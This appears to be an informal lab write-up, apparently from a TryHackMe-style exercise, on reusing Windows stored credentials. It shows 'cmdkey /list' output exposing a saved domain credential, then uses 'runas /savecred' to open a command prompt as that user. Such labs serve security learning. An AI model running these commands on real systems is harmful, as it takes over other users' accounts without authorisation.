this is an alternative to the other method, just as decent tho

The RunAs tool has various command arguments that could be used in the Windows system. The /savecred argument allows you to save the credentials of the user in Windows Credentials Manager

Another way to enumerate stored credentials is by using cmdkey, which is a tool to create, delete, and display stored Windows credentials.
By providing the /list argument, we can show all stored credentials, or we can specify the credential to display more details /list:computername.

cmdkey /list

the output can show if you have some sort of stored username going on.
with this, then you need to run as this user within this domain.

for example, let me put this:

output from cmdkey /list:

C:\Users\thm>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=thm.red\thm-local
    Type: Domain Password
    User: thm.red\thm-local

then, we can see that we have a password stored as thm-local. from this
we will now use the runas command to our advantage to do this:

runas /savecred /user:THM.red\thm-local cmd.exe
Attempting to start cmd.exe as user "THM.red\thm-local"

now, we could have a terminal under the thm-local account!
